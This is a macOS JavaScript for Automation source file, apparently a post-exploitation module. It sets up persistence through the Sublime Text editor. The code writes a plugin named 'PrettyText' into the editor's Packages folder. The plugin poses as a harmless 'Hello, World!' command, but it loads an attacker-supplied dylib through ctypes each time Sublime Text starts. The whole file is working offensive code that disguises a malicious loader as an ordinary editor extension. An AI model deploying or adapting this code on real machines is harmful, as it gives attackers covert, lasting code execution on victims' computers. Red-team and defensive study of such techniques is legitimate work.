//Sublime Text Plugin Persistence
//https://cnpagency.com/blog/creating-sublime-text-3-plugins-part-1/
//Requires Dylib on target
//Concept from Xorrior

//example usage
//SublimeTextPluginPersistence('/Users/itsatrap/Desktop/DylibTesting/inject.dylib')


function SublimeTextPluginPersistence (pathToDylib) {
ObjC.import('Foundation')
ObjC.import('stdlib')
var app = Application.currentApplication();
app.includeStandardAdditions = true;

var userHome = $.getenv('HOME')

var output = ""
try{
	function listDirectory(strPath) {
		var fm = $.NSFileManager.defaultManager;
        return ObjC.unwrap(
                fm.contentsOfDirectoryAtPathError($(strPath)
                    .stringByExpandingTildeInPath, null))
            .map(ObjC.unwrap);
    	}
	
	function chmod(value, path) {
        let a = $({NSFilePosixPermissions:value})
        let p = $(path).stringByStandardizingPath
        let e = $()
        let r = $.NSFileManager.defaultManager
                .setAttributesOfItemAtPathError(a, p, e)
        return r
    	}
        
	function writeTextToFile(text, file, overwriteExistingContent) {
        var fileString = file.toString()
        var openedFile = app.openForAccess(Path(fileString), { writePermission: true })
        if (overwriteExistingContent) {
            app.setEof(openedFile, { to: 0 })
        }
        app.write(text, { to: openedFile, startingAt: app.getEof(openedFile) })
        app.closeAccess(openedFile)
}
		
	function writePlugin(sublimetextPluginPath,uploadedDylib)	{

var pluginTemplate = `
import sublime
import sublime_plugin
import sys
import ctypes
from ctypes import *

class ExampleCommand(sublime_plugin.TextCommand):
	def run(self, edit):
		self.view.insert(edit, 0, "Hello, World!")

libc = "/usr/lib/libSystem.B.dylib"
lib = ctypes.CDLL(libc)

load = UpdateDyLibPath
handle = ctypes.CDLL(load)`

	var pluginPath = sublimetextPluginPath + "PrettyText"
	isDir=Ref()
	var pluginDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(pluginPath,isDir)
	if (pluginDirectoryExistsCheck == false) {
		$.NSFileManager.defaultManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(pluginPath, false, $(), $())
		}
	var updatedPlugin = pluginTemplate.replace(/UpdateDyLibPath/g,'"' + uploadedDylib + '"' )
	writeTextToFile(updatedPlugin, pluginPath + '/PrettyText.py', true)
	}					
	
	var sublime2Dir = userHome + '/Library/Application\ Support/Sublime\ Text\ 2' 
	var sublime3Dir = userHome + '/Library/Application\ Support/Sublime\ Text\ 3'
	
    Sublime2ExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath(sublime2Dir)
                if (Sublime2ExistsCheck == false) {	
				 	Sublime3ExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath(sublime3Dir)
                		if (Sublime3ExistsCheck == false) {	
						output += "Sublime Text 2 or 3 is not installed on the target"
									 
						} else {
						 sublimePluginPath = sublime3Dir + '/Packages/'
						 writePlugin(sublimePluginPath,pathToDylib)
						 chmod(0o755,sublimePluginPath + "/PrettyText/PrettyText.py")
						 executeBackground(sublimePluginPath + "/PrettyText/PrettyText.py")
						 output += "Sublime Text Plugin Persistence enabled at " + sublimePluginPath + "/PrettyText/PrettyText.py"
						 		} 		
					} else {
						 sublimePluginPath = sublime2Dir + '/Packages/'
						 writePlugin(sublimePluginPath,pathToDylib)
						 chmod(0o755,sublimePluginPath + "/PrettyText/PrettyText.py")
						 output += "Sublime Text Plugin Persistence enabled at  " + sublimePluginPath + "/PrettyText/PrettyText.py"
						 	}
				
}catch(error){
       output += error.toString()
		}
	return output
}
